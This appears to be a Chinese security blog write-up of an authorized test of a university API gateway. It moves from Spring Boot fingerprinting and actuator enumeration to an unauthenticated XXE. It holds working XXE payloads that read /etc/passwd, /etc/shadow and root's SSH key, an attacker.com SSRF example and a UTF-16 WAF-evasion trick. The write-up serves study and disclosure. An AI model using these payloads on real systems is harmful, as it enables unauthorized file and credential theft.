---
translationKey: xxe-esop-gateway-unauthorized-file-read
locale: zh-cn
routeSlug: xxe-esop-gateway-unauthorized-file-read
title: 记一次 EDU 未授权 XXE：从网关指纹到任意文件读取
excerpt: 一次授权测试复盘：靠响应头识别 Spring Boot 1.x 网关，从业务端点的 XML 回显通道切入，用 DTD 外部实体把任意文件读取跑通。
author: A1right
seoTitle: EDU 未授权 XXE：从网关指纹到任意文件读取
seoDescription: 复盘一次授权测试：识别 Spring Boot 1.x 网关、定位无鉴权业务端点、确认 XML 实体回显，最终通过外部实体实现任意文件读取。
categoryKey: web-security
category: Web 安全
tags:
  - XXE
  - Spring Boot
  - 任意文件读取
  - 未授权访问
  - 渗透测试
visibility: public
publishMode: now
publishedAt: 2026-11-04
updatedAt: 2026-11-04
cover: /images/uploads/xxe-esop-gateway-cover.jpg
coverAlt: 白发蓝眼少女插画封面
contentType: original
allowRepost: forbid
pinned: false
draft: false
---

> ## ⚠️ 免责声明
>
> 1. **本文仅用于网络安全技术研究与学习交流**，目的在于帮助开发者和运维人员理解风险、改进防护。
> 2. 文中涉及的测试行为均在**已获得合法授权**的范围内进行，测试过程遵循最小影响原则：未读取业务数据、未使用获取的凭据连接任何系统、未做任何写入或状态变更操作。
> 3. 文中所有敏感信息（域名、IP、学校/单位名称、账号、口令、密钥）均已**脱敏处理**，演示数据为虚构或已失效。
> 4. 相关漏洞已报告至厂商，并已完成修复/正在修复中。
> 5. **严禁将本文任何技术内容用于未经授权的测试或非法用途。** 任何个人或组织因违反法律法规、未经授权使用本文内容所造成的后果，由使用者自行承担，作者不承担任何连带责任。
> 6. 转载请注明出处。**禁止将本文内容用于任何商业用途或违法活动。**

# 前置知识点：

## 什么是XML：

XML = **e**Xtensible **M**arkup **L**anguage，**可扩展标记语言**。一句话：**一种用标签描述数据的文本格式，让不同程序之间能交换数据。**

### 长什么样

```
<?xml version="1.0" encoding="UTF-8"?>
<学生>
    <姓名>张三</姓名>
    <年龄>20</年龄>
    <专业>计算机</专业>
</学生>
```

就这么简单——**和你在纸上填表差不多，只是用标签把每个字段框起来**。

同样的数据用表格表示是：

| 姓名 | 年龄 | 专业   |
| :--- | :--- | :----- |
| 张三 | 20   | 计算机 |

XML 就是把表格竖过来写，每一格画一个标签。

### 关键特点：标签自己取名

这是"**可扩展**"三个字的含义。

HTML 的标签是定死的——`<div>`、`<p>`、`<table>`，W3C 规定了你就得用这些。

XML **没有预定义标签**，你想叫什么就叫什么：

```
<订单>...</订单>
<order>...</order>
<订单编号="123">...</订单>
```

`<学生>`、`<姓名>`、`<年龄>` 这些标签谁定的？**写文档的人自己定的**。解析器不关心标签叫什么，只关心**结构是否合法**。

### 为什么渗透测试要专门研究它

因为 XML 有一个**别的数据格式没有的能力**：**DTD**。

JSON 只能表达数据，XML 除了数据还能**定义规则**——包括定义"实体"，而实体可以指向**外部资源**：

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">     ← 让解析器去读服务器上的文件
<!ENTITY xxe SYSTEM "http://内网地址">        ← 让解析器发起 HTTP 请求
```

**这两种能力单看都有正当用途**（比如把常用片段定义成实体复用），但一旦允许用户提交的 XML 里出现 DTD，就变成了任意文件读取和 SSRF。

**这就是 XXE 的土壤**——漏洞不在数据里，在"XML 允许文档自己定义读取规则"这个设计上。

## XXE注入：

**XXE = XML External Entity Injection（XML 外部实体注入）**，CWE-611。

本质：**XML 允许文档自己定义"变量"，还允许这个变量的值来自服务器上的任意资源——而应用把这个能力开放给了用户输入。**

漏洞不在 XML 本身，在**解析器的配置**。

### 漏洞是怎么形成的

XML 规范里有个功能叫 **DTD**（文档类型定义），它允许这样写：

```
<!DOCTYPE 文档 [<!ENTITY 变量名 SYSTEM "资源地址">]>
```

解析器读到这行，会**真的去「资源地址」把内容读进来**，填到「变量名」的位置。

这个功能有两个正当用途：

- 把重复的文本片段定义成实体复用
- 用 DTD 文件校验文档结构

**问题在于**：各语言的 XML 解析器**默认行为不一致**，很多为了兼容老应用，**默认把这个功能开着**：

| 语言                          | 默认状态                                |
| :---------------------------- | :-------------------------------------- |
| Java `DocumentBuilderFactory` | **允许 DTD + 外部实体**（危险）         |
| PHP libxml (< 8.0)            | **允许**（PHP 8.0+ 改为默认禁止）       |
| Python `lxml`                 | **允许**                                |
| .NET `XmlReader`              | `DtdProcessing` 默认 Prohibit（较安全） |

**只要代码里是 `DocumentBuilderFactory.newInstance()` 之后什么都没配置，那就是默认 vulnerable。**

XXE 分两类，**区别就在于结果显不显示**：

| 类型         | 实体展开 | 能看到内容吗 | 能干什么                                 |
| :----------- | :------- | :----------- | :--------------------------------------- |
| **盲 XXE**   | ✅        | ❌            | 只能 SSRF / 时间盲注，**读不出文件内容** |
| **带内 XXE** | ✅        | ✅            | **直接读到文件全文**                     |

绝大多数目标是盲的——实体确实被展开、服务端确实去读了文件，但**结果不返回给攻击者**，你只能通过"外连一个自己的服务器"或者"响应时间有差异"来证明它存在。价值大打折扣。

而 `应用[MARK]在系统中不存在` 证明了：**这个服务端会把你的输入放进响应里**。

于是把"输入点"接上"文件读取"就变成一步之遥：

```
你输入 MARK    →  响应显示 MARK
你输入 &xxe;   →  响应显示 &xxe; 展开后的内容
&xxe; = 读文件  →  响应显示 = 文件内容
```

**回显通道就是 XXE 的输出管道。** 有它，任意文件读取成立；没它，最多证明一个盲 XXE。

## 什么是任意文件读取：

### 一句话

**攻击者可以指定服务器上的任意路径，让应用把这个文件的内容返回给他。**

关键词是「**任意**」——不是只能读某个固定文件，而是**路径由攻击者控制**。

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">     ← 我指定 /etc/passwd
<!ENTITY xxe SYSTEM "file:///etc/shadow">     ← 我指定 /etc/shadow
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">  ← 我指定 root 的私钥
```

**那个路径位置填什么，就读什么**。这就是"任意"。

# 网站情况

我们先访问这个网站，看看什么情况

这个网站是在我的信息收集过程中偶然看到的，感觉有点东西，于是深挖来看看

![ESOP 网关默认占位页与响应头](/images/uploads/xxe-esop-gateway-01.png)

访问 网页会返回一个 630 字节的静态页，标题为 `Welcome to ESOP Gateway`，正文只有一行居中的 `Welcome to APIs !`。页面上没有任何登录入口或外链——它纯粹是网关的默认占位页，但响应头同时给出了厂商名（`Server: ****`）、应用标识与端口（`X-Application-Context: esop-gateway:8006`）以及负载均衡 cookie 前缀（`route=`），足以完成产品识别。

# 确认框架

我们先抓包简单看看

![响应头中的 X-Application-Context 应用标识](/images/uploads/xxe-esop-gateway-02.png)

`X-Application-Context` 不是 HTTP 标准头（IANA 注册表里没有它），它是 Spring Boot 1.x 的 `ApplicationContextHeaderFilter` 给每个响应打上的标记：

```
// Spring Boot 1.x: org.springframework.boot.web.filter.ApplicationContextHeaderFilter
public static final String HEADER_NAME = "X-Application-Context";
```

Spring Boot 2.0 在重构 Web 模块时删掉了这个 filter，这个头就消失了。

同时，这里的Server就会告诉我们厂商的名字→ 去搜这家产品的已知问题，esop-gateway应用名 → 去搜这个模块的资料，8006后端真实端口 → 稍后测它是否直连可绕前置

# 确认 actuator 开没开，顺带把世代钉死

## actuator 探测

光知道"是 Spring Boot"不够。Spring Boot 的**攻击面几乎全在 actuator 上**

Spring Boot 1.x 的 actuator 没有 `/actuator` 前缀，直接就是 `/health`、`/info`那按 1.x 的端点清单打一轮。**不用猜，这是框架写死的固定列表**：

```
/health  /info  /env  /beans  /mappings  /configprops
/dump  /trace  /heapdump  /jolokia  /routes  /metrics  /autoconfig
```

**为什么优先这几个**——按危害排序：

| 端点           | 拿到什么                                 |
| :------------- | :--------------------------------------- |
| `/env`         | 环境变量，可能直接含数据库密码、密钥     |
| `/mappings`    | **应用注册的全部 URL 路径** ← 这个最值钱 |
| `/configprops` | 配置属性，可能有连接串                   |
| `/heapdump`    | 内存转储，能离线下挖出凭据               |
| `/jolokia`     | JMX 网关，历史上多次 RCE                 |
| `/routes`      | Zuul 的路由表（顺带确认有没有用 Zuul）   |

我们直接把 actuator 的端点全枚举一遍，拿个字典去fuzz得了

![actuator 端点枚举结果](/images/uploads/xxe-esop-gateway-03.png)

然后我们发现本例结果是：

```
/health  /info           → 200  未授权可达
/env  /beans  /mappings  → 401  存在但被鉴权挡住
/routes                  → 401  ← 注意这个
```

**这里的判读是整条链上第一个关键点**：

- **200** → 直接读数据
- **401** → 端点**存在**，但被保护。**不要划掉它**，要记下来
- **404** → 真的没有，排除

`/health` `/info` 通、其他 401，说明鉴权是**白名单模式**——只放行了几个。这种"部分放行"的配置习惯，往往会在别处重复出现，所以要留意。

**如果 actuator 全 401**：说明安全配置做得好，这条路走死 → 立刻转向下一阶段，别在绕过上耗太久（本例试了 20 多种绕过，包括 `;` 矩阵参数、大小写、后缀、`X-Forwarded-*`、编码，全部失败，确认这条路封死了）。

# 从"框架层"转向"应用层"

前面的所有动作都在测**框架自带的通用攻击面**——而通用意味着"每个用 Spring Boot 的站点都会被测这几下"，所以厂商必然重点防护。本例也确实防住了（401）。

真正的增量在**这个产品自己写的业务端点**上。原因很简单：

- 框架端点 = 厂商配置一下就完事，容易加固
- 产品业务端点 = 厂商自己写的代码，每个都要单独检查鉴权，**漏一个就出洞**

所以下一步的目标变成：**找到这个产品自己的 URL 路径**。

**路径从哪来**，按可靠性排序：

1. **前端 JS**——打开站点，把页面引用的 JS 全拉下来，正则提取里面的 URL 字符串。这是最完整的来源，产品前端要调后端，路径必然写在 JS 里
2. **报错信息**——故意发畸形请求，看错误里有没有暴露内部路径
3. **同产品其他部署**——你已经收集了一批 `apis.<学校>` 的资产，任何一台上泄露的路径，对所有同类部署都适用
4. **搜索引擎 / GitHub**——搜产品名 + 路径关键词

我们再对API路径进行爆破

![业务端点返回 401 与消息体格式错误提示](/images/uploads/xxe-esop-gateway-04.png)

我们会发现返回401，并且说接口传入的消息体格式不正确，**401 是业务错误码，不是鉴权拦截**——请求已经进了业务逻辑，接口传入的消息体格式不正确说明端点存在，**它期待特定格式的请求体**（XML），当前 body 不合规

我们改成post，随便传入参数试试

![改为 POST 提交参数后仍返回同一错误](/images/uploads/xxe-esop-gateway-05.png)

发现是一样的，都是401，传入的消息格式不正确

那我们就对这个Content-Type以及body进行爆破

![Content-Type 爆破后响应发生变化](/images/uploads/xxe-esop-gateway-06.png)

发现，当我们改成xml的时候，返回包变化了

我们来到bp的插件商城**装 `Content Type Converter` 插件**

![Burp 安装 Content Type Converter 插件](/images/uploads/xxe-esop-gateway-07.png)

以后在 Repeater 里右键 → `Extensions → Content Type Converter → Convert to XML`，它自动把 body 换格式、自动改 Content-Length。**你要记的配对关系，它替你记。**

![转换为 XML 后响应回显 appId 内容](/images/uploads/xxe-esop-gateway-08.png)

当我们改成xml的格式时，发现返回包发生了变化

响应体是：

```
{"resultCode":"401","resultMessage":"应用[MARK]在系统中不存在","data":null}
```

**第一，`MARK` 被你刚才提交的值原样回显了。** 服务端的消息模板长这样：

```
应用[%s]在系统中不存在
```

`%s` 就是你的 `<appId>` 值。**任何你放进去的东西，都会出现在响应里。**

**第二，请求进了业务逻辑。** 没带任何 Cookie/Token 却拿到了业务错误（而不是鉴权拦截），说明这个路径**没有鉴权保护**。

**第三，参数名和格式都对。** 它成功取出了 `<appId>` 的值——名字错了或格式错了，就不会走到这一步。

**第四，`MARK` 不是有效应用。** 它拿这个值去查了注册表，没查到。这也顺带告诉你产品的数据模型：开放平台网关管理着注册的"应用"，每个应用有个 appId。

我们来试试我们的传参能不能被解析

```
发送：<request><appId>&#65;</appId></request>
回显：应用[A]
        ↑
     输入 5 个字符，输出 1 个字符
```

![十六进制实体被解析为单个字符 A](/images/uploads/xxe-esop-gateway-09.png)



**输入 5 个字符，输出 1 个字符**——这就是"实体被展开"的铁证。如果服务端只是原样回显，这里应该显示 `A` 这 5 个字符。

# 实现XXE+任意文件读取成立

## **第 1 步（已完成）** 普通文本回显

```
<request><appId>MARK</appId></request>
```

→ `应用[MARK]在系统中不存在`

## **第 2 步：内部实体是否会被展开**（关键中间验证）

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [<!ENTITY xxe "HELLO">]>
<request><appId>&xxe;</appId></request>
```

预期 → `应用[HELLO]在系统中不存在`

**这一步必须单独做**。它证明的是"解析器允许 DTD、且实体展开结果会进回显位置"——跟文件系统无关，纯粹验证机制。

这个 payload 的本质是：**XML 里可以自己定义"宏"，然后在正文里引用它。**

### 逐行拆解

```
<?xml version="1.0" encoding="UTF-8"?>
```

**第 1 行：XML 声明。** 相当于文件头，告诉解析器"这是个 XML 文档，用 UTF-8 编码读"。必须是文件的第一行。

```
<!DOCTYPE request [<!ENTITY xxe "HELLO">]>
```

**第 2 行：定义宏。** 这是整个攻击的核心，拆成三块：

| 片段                     | 作用                                              |
| :----------------------- | :------------------------------------------------ |
| `<!DOCTYPE request ...>` | 声明"这个文档的根元素叫 `request`"                |
| `[...]`                  | 方括号里可以往里塞自定义定义（叫"内部 DTD 子集"） |
| `<!ENTITY xxe "HELLO">`  | **定义一个宏**：名字叫 `xxe`，值是 `HELLO`        |

```
<request><appId>&xxe;</appId></request>
```

**第 3 行：使用宏。** `&xxe;` 就是"把 `xxe` 这个宏的内容放这里"。这是 XML 的**实体引用语法**。

### 解析器实际做了什么

把宏展开，就是一次**文本替换**：

```
定义：xxe = HELLO

正文（你提交的）：        <request><appId>&xxe;</appId></request>
                        ↓ 解析器替换 &xxe; 为 HELLO
解析后（应用看到的）：     <request><appId>HELLO</appId></request>
```

所以应用收到的 `<appId>` 值是 `HELLO`，而不是字面的 `&xxe;`。

**换个编程语言的类比**：

```
xxe = "HELLO"                    # ← <!ENTITY xxe "HELLO">
print(f"应用[{xxe}]在系统中不存在")  # ← <appId>&xxe;</appId>
```

一模一样的思路，只是 XML 自带了这套机制。

![内部实体 HELLO 被展开并回显](/images/uploads/xxe-esop-gateway-10.png)

## 那这个 payload 为什么能变成攻击

差别只在**宏的值从哪来**：

```
<!-- 内部实体：值写死在文档里 -->
<!ENTITY xxe "HELLO">
值是 HELLO

<!-- 外部实体：值让解析器去外部取  ← 这就是 XXE -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
SYSTEM 关键字 + 一个 URI     解析器真去读了这个文件，把内容当作宏的值
```

`SYSTEM` 是 XML 规范里的关键字，意思是"这个实体的值不在文档里，去后面这个地址取"。

地址可以写：

| URI                            | 效果                          |
| :----------------------------- | :---------------------------- |
| `file:///etc/passwd`           | 读服务器本地文件              |
| `http://attacker.com/x`        | 让服务器发起 HTTP 请求 → SSRF |
| `http://127.0.0.1:8006/health` | 探内网服务                    |

## 为什么先发 `HELLO` 而不是直接读文件

因为这个 payload 的作用是**单独验证一件事**：

> 我定义的实体，解析器会不会展开？展开后会不会显示在响应里？

它跟文件系统无关，纯粹测机制。如果这一步就成功（响应里出现 `HELLO`），说明：

1. ✅ 解析器允许 DTD（`<!DOCTYPE>` 没被禁）
2. ✅ 实体语法正确
3. ✅ 展开结果确实进了回显位置

**三个条件都验证过了，再把 `"HELLO"` 换成 `SYSTEM "file:///etc/passwd"`，就是纯替换一个值的事。**

反过来，如果这一步只回了 `应用[]在系统中不存在`（空的），说明解析器拒绝了 DTD——那后面读文件也不用试了，**这是提前止损**。

## 语法对照

**内部实体**（值写在文档里）：

```
<!ENTITY xxe "HELLO">
```

拆开看：

```
<!ENTITY   xxe    "HELLO"   >
   ↑        ↑        ↑
 声明     实体名   字面量（引号括起来的普通文本）
```

**外部实体**（值在文档外面）：

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

```
<!ENTITY   xxe    SYSTEM    "file:///etc/passwd"   >
   ↑        ↑       ↑              ↑
 声明     实体名  关键字      系统标识符（URI）
```

**差别的核心就是中间那个 `SYSTEM`。** 有它 = 外面取，没它 = 里面写。

## 解析器行为的区别（这才是本质）

```
<!-- 内部实体 -->
<!ENTITY xxe "HELLO">
```

解析器：`哦，xxe 就是 HELLO`，纯文本替换，**不碰任何外部资源**。

```
<!-- 外部实体 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

解析器：`xxe 的值在 file:///etc/passwd 这个位置，我去读一下` → **真的打开文件读取** → 把读到的内容当作 xxe 的值。

**内部实体只做字符串替换，外部实体让解析器去读文件 / 发网络请求**

![外部实体读取 /etc/passwd 成功回显](/images/uploads/xxe-esop-gateway-11.png)

这个 payload 分成五段，逐段拆：

```
[1] ÿþ                                    ← BOM
[2] <?xml version="1.0" encoding="UTF-16"?>   ← XML 声明
[3] <!DOCTYPE request [                   ← DTD 开始（内部子集）
[4]   <!ENTITY xxe SYSTEM "file:///etc/passwd">  ← 定义外部实体
[5] ]>                                    ← DTD 结束
[6] <request><appId>&xxe;</appId></request>   ← 业务正文
```

## 第 1 段：`ÿþ` —— BOM（2 字节）

```
FF FE
```

`ÿ` 是 0xFF，`þ` 是 0xFE，Burp 把这两个字节按 Latin-1 显示成了两个字符。

**作用**：告诉解析器"这份文档是 UTF-16 **Little Endian**"。

UTF-16 有两种排法，同一个 `<` 可以存成 `3C 00`（LE）或 `00 3C`（BE）。没有 BOM 就得靠猜。**这两个字节同时还是绕 WAF 的关键之一**（下面说）。

------

## 第 2 段：`<?xml version="1.0" encoding="UTF-16"?>` —— XML 声明

```
<?xml        version="1.0"    encoding="UTF-16"    ?>
  ↑              ↑                  ↑
处理指令      XML 版本          文档编码
```

必须放在文档最前面（BOM 之后）。

**注意**：这里写的是 `UTF-16`，不是 `UTF-16LE`。因为字节序已经由 BOM 确定了，声明里只说是 UTF-16 家族即可。

------

## 第 3 段：`<!DOCTYPE request [` —— DTD 声明开始

```
<!DOCTYPE   request    [
    ↑          ↑        ↑
  声明      根元素名   内部子集开始
```

这是整个攻击的**开关**，两个作用：

1. **`request`** —— 声明"本文档的根元素叫 `request`"。**这个名字必须和后面第 6 段的 `<request>` 完全一致**，否则解析报错。
2. **`[`** —— 表示后面是"内部 DTD 子集"（internal subset），**只有在这个方括号里才能定义实体**。

**如果服务端配置了 `disallow-doctype-decl=true`，这一行会被直接拒绝，整个文档解析失败** —— 这就是"真加固"的表现。

------

## 第 4 段：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` —— 定义外部实体

```
<!ENTITY    xxe    SYSTEM    "file:///etc/passwd"
   ↑         ↑       ↑              ↑
 定义实体   名字   关键字      系统标识符(URI)
```

**这是 XXE 的核心**，四个部分：

| 部分                   | 作用                                                         |
| :--------------------- | :----------------------------------------------------------- |
| `<!ENTITY`             | 声明"我要定义一个实体"                                       |
| `xxe`                  | 实体名，**你自己起的**，后面用它来引用                       |
| `SYSTEM`               | **关键关键字**——表示"这个实体的值不在文档里，去外面取"       |
| `"file:///etc/passwd"` | 去哪取。`file://` 是本地文件协议，也可以是 `http://`（SSRF） |

**解析器读到这一行时会做什么**：

```
记一条规则：以后遇到 &xxe; → 打开 /etc/passwd → 把内容读进来
```

注意它**此刻还没读**，只是登记了这条规则，等到第 6 段真正引用时才执行。

------

## 第 5 段：`]>` —— 关闭 DTD

```
]    >
↑    ↑
关内部子集   关 DOCTYPE
```

这俩符号很容易写错或漏写。写成 `]` `>` 两个字符，紧挨着。

------

## 第 6 段：`<request><appId>&xxe;</appId></request>` —— 正文

```
<request>          ← 根元素（与第 3 段声明的名字一致）
  <appId>          ← 服务端要的字段名
    &xxe;          ← 实体引用：把 xxe 的值放这里
  </appId>
</request>
```

**`&xxe;` 是引用，不是定义。** 它告诉解析器"到这里把 xxe 的内容展开"。

写法规则：**`&` 开头、`;` 结尾，中间是实体名**。和你天天见的 `<` `&` 是一个语法。